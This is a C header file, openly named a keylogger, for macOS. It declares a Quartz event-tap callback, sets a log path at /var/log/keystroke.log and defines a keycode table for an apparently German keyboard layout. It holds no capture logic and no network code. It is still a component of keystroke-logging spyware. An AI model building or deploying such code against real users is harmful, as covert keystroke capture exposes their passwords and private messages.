#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/keystroke.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int, bool);



const char *keyCodeMap[127][2] = {
    {"a","A"}, 
    {"s","S"},
    {"d","D"},
    {"f","F"},
    {"h","H"},
    {"g","G"},
    {"y","Y"},
    {"x","X"},
    {"c","C"},
    {"v","V"},
    {"^","°"}, 
    {"b","B"},
    {"q","Q"},
    {"w","W"},
    {"e","E"},
    {"r","R"},
    {"z","Z"},
    {"t","T"},
    {"1","!"},
    {"2","\""},
    {"3","§"}, 
    {"4","$"},
    {"6","&"},
    {"5","%"},
    {"´","`"},
    {"9",")"},
    {"7","/"},
    {"ß","?"},
    {"8","("},
    {"0","="},
    {"+","*"}, 
    {"o","O"},
    {"u","U"},
    {"ü","Ü"},
    {"i","I"},
    {"p","P"},
    {"[ENTER] ","[shift][ENTER] "},
    {"l","L"},
    {"j","J"},
    {"ä","Ä"},
    {"k","K"}, 
    {"ö","Ö"},
    {"#","'"},
    {",",";"},
    {"-","_"},
    {"n","N"},
    {"m","M"},
    {".",":"},
    {"[TAB] ","[shift]]TAB] "},
    {" "," "},
    {"<",">"}, 
    {"[BACKSP] ","[SHIFT][BACKSP] "},
    {"",""},
    {"[ESC] ","[shift][ESC] "},
    {"",""},
    {"",""},
    {"",""},
    {"",""},
    {"",""},
    {"",""},
    {"",""}, 
    {"",""},
    {"",""},
    {"",""},
    {"F17 ","[shift]F17 "},
    {"Num, ","[shift]Num, "},
    {"",""},
    {"Num* ","[shift]Num* "},
    {"",""},
    {"Num+ ","[shift]Num+ "},
    {"",""}, 
    {"NumCLR ","[shift]NumCLR "},
    {"",""},
    {"",""},
    {"",""},
    {"Num/ ","[shift]Num/ "},
    {"NumENTER ","[shift]NumENTER "},
    {"",""},
    {"Num- ","[shift]Num- "},
    {"F18 ","[shift]F18 "},
    {"F19 ","[shift]F19 "}, 
    {"Num= ","[shift]Num= "},
    {"Num0 ","[shift]Num0 "},
    {"Num1 ","[shift]Num1 "},
    {"Num2 ","[shift]Num2 "},
    {"Num3 ","[shift]Num3 "},
    {"Num4 ","[shift]Num4 "},
    {"Num5 ","[shift]Num5 "},
    {"Num6 ","[shift]Num6 "},
    {"Num7 ","[shift]Num7 "},
    {"Num8 ","[shift]Num8 "}, 
    {"Num9 ","[shift]Num9 "},
    {"",""},
    {"",""},
    {"",""},
    {"",""},
    {"F5 ","[shift]F5 "},
    {"F6 ","[shift]F6 "},
    {"F7 ","[shift]F7 "},
    {"F3 ","[shift]F3 "},
    {"F8 ","[shift]F8 "}, 
    {"F9 ","[shift]F9 "},
    {"",""},
    {"F11 ","[shift]F11 "},
    {"",""},
    {"F13 ","[shift]F13 "},
    {"F16 ","[shift]F16 "},
    {"F14 ","[shift]F14 "},
    {"",""},
    {"F10 ","[shift]F10 "},
    {"",""}, 
    {"F12 ","[shift]F12 "},
    {"",""},	
    {"F15 ","[shift]F15 "},
    {"",""},
    {"HOME ","[shift]HOME "},
    {"PgUP ","[shift]PgUP "},
    {"BACKSP ","[shift]BACKSP "},
    {"F4 ","[shift]F4 "},
    {"END ","[shift]END "},
    {"F2 ","[shift]F2 "}, 
    {"PgDOWN ","[shift]PgDOWN "},
    {"F1 ","[shift]F1 "},
    {"[LEFT] ","[shift][LEFT] "},
    {"[RIGHT] ","[shift][RIGHT] "},
    {"[DOWN] ","[shift][DOWN] "},
    {"[UP] ","[shift][UP] "}
};


#endif